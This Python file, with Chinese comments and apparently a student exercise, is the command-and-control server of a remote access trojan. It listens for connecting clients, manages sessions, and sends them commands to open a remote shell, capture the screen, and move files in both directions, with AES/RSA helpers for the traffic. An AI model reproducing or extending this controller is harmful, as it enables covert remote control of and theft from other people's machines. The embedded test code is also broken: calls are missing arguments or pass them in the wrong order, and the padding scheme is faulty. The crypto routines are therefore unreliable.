#导入需要使用的库
#开发+测试：杨颜冰
import os.path
import socket
import sys
from threading import Thread
import threading
import base64
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

#执行命令
def exec_cmd(client_sock, cmd):
    cmd = cmd.split()
    if cmd[0] == 'upload_file':
        upload_file(client_sock,cmd)
    elif cmd[0]  =='help':
        print(format('''
        ============================
        上传：upload_file  (文件名） （保存到路径）
        _____________________________
        系统命令：os-shell   截图：image (保存到路径）
        _____________________________
        下载文件：download_file  
        =============================
        注意：指令使用space作为分割
        '''))
    elif cmd[0]  =='os-shell':
        os_shell(client_sock,cmd)
    elif cmd[0]  =='image':
        image(client_sock,cmd)
    elif cmd[0]  =='download_file':
        download_send(client_sock,cmd)

#截图桌面
def image(client_sock,cmd):
    cmd = " ".join(cmd)
    send_content(client_sock,cmd.encode())
    # path = os.path.join(file_dir, cmd[1])
    # file = open(path, 'wb')
    # for i in range(file_size):
    #     data = client_sock.recv(1024)
    #     file.write(data)
    # file.close()
    # client_sock.send("上传成功".encode())

#上传文件
def upload_file(client_sock,cmd):
    #upload 1.txt d:\
    #srtip() 删除命令字符串两端的空字符
    #验证命令完整性
    if len(cmd) != 3:
        print('命令错误，请输入help查看命令详情')
        return
    #验证文件是否存在
    if not os.path.exists(cmd[1]):
        print('文件不存在，请检查文件')
        return
    #读文件，发送刚上传文件命令
    #先获取文件大小，计算发送次数
    file_size = os.path.getsize(cmd[1])
    #计算数据发送次数
    tmp= file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE +1
    else:
        count =file_size // MAX_SEND_SIZE
    #把命令发送过去
    send_cmd(client_sock,cmd,str(count))
    #读取文件内容并发送
    file = open(cmd[1],'rb')
    for i in range(count):
        data =file.read(MAX_SEND_SIZE)
        send_content(client_sock,data)
    file.close()


#发送文件的命令
def send_cmd(client_ssock,cmd:list,count = ''):
    # 要发送的数据 = 命令 文件大小 文件名后面要带后缀
    # [1,2,3]"1 2 3"

    data= ' '.join(cmd)+" "+count
    #发送的数据类型必须是字节串
    client_ssock.send(data.encode())

#第二次直接发送内容
def send_content(client_sock, conent:bytes):
    client_sock.send(conent)


#客户端 套接字
def client_sock():
    pass


#执行系统命令
#进入目标系统命令行执行系统命令
def os_shell(client_sock, cmd:list):
    #cmd = 'os_shell'
    #发送命令
    send_cmd(client_sock, cmd)
    #client_sock.send(cmd.encode())
    #创建一个死循环，在其中输入要执行的系统命令
    while True:
        cmd = input('os-shell>>>')
        #先发送，确保退出的时候，客户端那边也退出
        # client_sock.send(cmd.encode())
        send_content(client_sock, cmd.encode())
        if cmd == 'exit':
            break


#会话管理————
#保存所有客户端的套接字
client_list = []
# [(1,2),(3,4)]
#当前正在使用的客户端套接字
client_cur =None

#等待客户端的连接
def wait_for_client(sock):
    global client_list  #global声明修改的是全局变量
    while True:
        print('等待连接....')
        client_sock , client_obj =sock.accept()
        #连接到一个客户端就创建一个与之对应的线程
        t = threading.Thread(target = recv_client_msg,args = (client_sock,client_obj))
        t.start()
        #连接成功就保存到客户端列表中
        client_list.append((client_sock, client_obj))
        print(f'客户端{client_obj}上线')

#切换会话
def change(cmd):
    global client_cur
    # cmd = cmd.split(cmd)
    #带参数的命令都要先验证完整性
    #验证命令完整性
    if len(cmd)  !=2:
        print('命令错误，请输入help查看命令详情')
        return
    #验证回话id是否存在
    id=int(cmd[1])
    if 0 <= id < len(client_list):
        #是个有效ID
        #切换会话
        client_cur = client_list[id][0]
        print('客户端切换成功')
    else:
        print('切换失败，请重新检查会话列表')

#向客户端发送下载命令
def download_send(client_sock,cmd):
    data = " ".join(cmd)
    client_sock.send(data.encode())


#下载文件
def download_file(client_sock,cmd):
    # cmd = [download, desk.jpg, d:\, 2]
    # #验证命令完整性
    file_dir = cmd[2]
    if not os.path.exists(file_dir):
        file_dir = os.getcwd()
    file_size =int(cmd[-1])
    #创建内容
    #join合成目录
    path = os.path.join(file_dir,cmd[1])
    print(f'path={path}')
    file = open(path,"wb")
    for i in range(file_size):
        data = client_sock.recv(1024)
        file.write(data)
    file.close()
    print(f"{cmd[1]}文件下载成功")


#接收来自客户端的信息
def recv_client_msg(client_sock, client_obj):
    while True:
        #处理来自客户端的消息
        data = client_sock.recv(1024).decode()
        data1 = data.split(" ")
        if not data :
            print(f'客户端{client_obj}下线')
            break
        elif data1[0] == "download_file":
            download_file(client_sock, data1)
        else:
            print(data)

#AES加密解密（传输内容）
#AES加密数据必须是16的整数倍
data_text ='你好，TOM'
#创建key和iv
key = Random.get_random_bytes(32)
iv = Random.get_random_bytes(16)

#AES加密
def aes_encode(data:str):
    #创建AES对象
    aes= AES.new(key, AES.MODE_CBC,iv)
    #保证加密的数据字节个数是16的倍数
    ret =len(data.encode()) % 16  #取余查看
    if ret :
        #用加号或者建好填充，保证是16的倍数
        # data +='+'
        if len(data) % 16 != 0:
            # 不是16的倍数，必须要填充到16的倍数长度
            tmp = len(data) % 16
            fill = b'+'
            for i in range(16 - tmp):
                # 判断数据末尾字符是否和填充字符相同
                if data[-1] == fill:
                    fill = b'-'
                    data += fill
                else:
                    data += fill
        # 使用AES对象加密
        ret = aes.encrypt(data.encode())
        return ret, fill
# print(aes_encode(('hello'.rstrip('+').encode())))

#AES解密
#AES解密需要重新创建AES对象
def ase_decode(data:bytes,fill):
    #创建ASE对象
    aes = AES.new(key,AES.MODE_CBC,iv)
    ret = aes.decrypt(data)
    #返回解密后的数据，删除多余的加号
    return ret.decode().strip(fill)
#测试代码
text = '你好，TOM'
ret = aes_encode(text)
ret = ase_decode(ret)
print(ret)

#RSA加密解密（用于AES）
def createRSAkey():
    #RSA 需要创建公钥私钥
    #密钥长度一般是1024的倍数
    #能加密的数据长度<=1024/8
    #创建RSA对象
    rsa = RSA.generate(1024)
    #创建公钥
    public_key = rsa.public_key().exportKey()
    #创建私钥 直接导出
    private_key = rsa.exportKey()
    #返回创建的公钥和私钥
    return public_key,private_key

#用RSA进行加密
def rsa_encode (public_key,data:str):
    #创建RSA对象
    pub = RSA.importKey(public_key)
    #创建加密算法对象
    rsa_obj = PKCS1_v1_5.new(pub)
    #公钥加密
    encryptext = rsa_obj.encrypt(data.encode())
    #返回密文
    return encryptext
def rsa_decosde(private_key,data:bytes):
    #私钥解密
    #创建RSA对象
    pri =RSA.importKey(private_key)
    #创建加密算法对象
    rsa_obj = PKCS1_v1_5.new(pri)
    plaintext=rsa_obj.decrypt(data,0)
    return plaintext.decode()

public_key, private_key = createRSAkey()
print(public_key, private_key)
ret = rsa_encode('hello'.encode(),public_key)
print(f'RSA加密后{ret}')
ret = rsa_decosde(ret,private_key)
print(f'RSA解密后{ret}')
#测试代码
text = '你好，TOM'
pub,prv = createRSAkey()
ret = rsa_encode(pub,text)
ret =rsa_decosde(prv,ret)
print(ret)


#创建服务器端————
#创建一个套接字 tcp连接
sock = socket.socket()
server_sock = sock
#绑定端口和IP
sock.bind(('127.0.0.1',12335))
#设置监听
sock.listen(5)
MAX_RECV_SIZE = 1024
MAX_SEND_SIZE = 1024
#等待客户端连接（阻塞）
t1= threading.Thread(target=wait_for_client,args=(sock,))
t1.start()


#主线程 只管发送消息

while True:
    #client_list 不为空 说明有客户端连接了
    if len(client_list) >0:
        #默认使用第一个连接上来的客户端
        client_cur = client_list[0][0]
        #程序主循环
        while True:
            #输入命令
            tmp = input(('RC--shell>>>>>'))#指令此时是字符串
            #change 1
            cmd = tmp.split(" ")#指令此时分割为列表
            # [upload, d:\1.txt,  d:\]
            if cmd[0] == 'exit':
                print('服务器主动断开连接')
                exit(0)
            elif cmd[0] == "change":
                change(cmd)
            elif cmd[0] == "os-shell":
                exec_cmd(client_cur,tmp)
            elif cmd[0] == "upload_file":
                exec_cmd(client_cur,tmp)
            elif cmd[0] == "image":
                exec_cmd(client_cur,tmp)
            elif cmd[0] == "download_file":
                exec_cmd(client_cur,tmp)
            elif cmd[0] == "help":
                exec_cmd(client_cur,tmp)
            else:
                #执行命令
                client_cur.send(tmp.encode())

